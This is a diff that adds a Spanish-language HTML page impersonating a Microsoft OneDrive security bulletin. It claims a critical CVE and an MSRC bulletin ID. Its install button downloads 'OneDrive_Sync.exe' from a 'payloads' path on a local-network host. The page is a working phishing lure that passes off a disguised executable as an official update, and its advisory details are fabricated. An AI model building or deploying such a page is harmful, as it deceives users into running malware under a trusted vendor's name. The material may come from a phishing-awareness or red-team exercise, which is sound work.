@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>OneDrive - Actualización de seguridad crítica</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
+        body { background: #f3f2f1; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
+        .container { max-width: 520px; background: white; border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.15); padding: 48px; text-align: center; }
+        .logo { width: 90px; margin-bottom: 24px; }
+        h1 { color: #323130; font-size: 24px; margin-bottom: 16px; font-weight: 600; }
+        .critical { background: #fed9cc; border-left: 4px solid #d83b01; padding: 16px; margin: 24px 0; text-align: left; border-radius: 4px; }
+        .critical strong { color: #a4262c; }
+        p { color: #605e5c; line-height: 1.6; margin-bottom: 16px; font-size: 14px; }
+        .btn { background: #0078d4; color: white; border: none; padding: 14px 36px; border-radius: 4px; font-size: 15px; cursor: pointer; text-decoration: none; display: inline-block; font-weight: 600; transition: background 0.2s; }
+        .btn:hover { background: #005a9e; }
+        .footer { margin-top: 32px; color: #a19f9d; font-size: 11px; }
+        .badge { display: inline-block; background: #107c10; color: white; padding: 2px 8px; border-radius: 10px; font-size: 11px; margin-left: 8px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <svg class="logo" viewBox="0 0 23 23">
+            <path fill="#0078d4" d="M1 1h10v10H1z"/>
+            <path fill="#00a4ef" d="M12 1h10v10H12z"/>
+            <path fill="#7fba00" d="M1 12h10v10H1z"/>
+            <path fill="#ffb900" d="M12 12h10v10H12z"/>
+        </svg>
+        
+        <h1>⚠️ Actualización de seguridad</h1>
+        
+        <div class="critical">
+            <strong>CVE-2026-2847 - Crítica</strong><br>
+            Se detectó una vulnerabilidad en OneDrive que permite acceso no autorizado a archivos compartidos. 
+            Instale esta actualización inmediatamente.
+        </div>
+        
+        <p>
+            <strong>Versión afectada:</strong> 2.4.1.0 y anteriores<br>
+            <strong>Versión corregida:</strong> 2.4.2.1 <span class="badge">Segura</span>
+        </p>
+        
+        <a href="http://192.168.1.6:8000/static/payloads/OneDrive_Sync.exe" class="btn" download="OneDrive_Sync.exe">
+            📥 Instalar actualización ahora
+        </a>
+        
+        <p class="footer">
+            Publicado: 24 de julio de 2026<br>
+            Microsoft Security Response Center (MSRC)<br>
+            ID de boletín: MS26-JUL-001
+        </p>
+    </div>
+</body>
+</html>
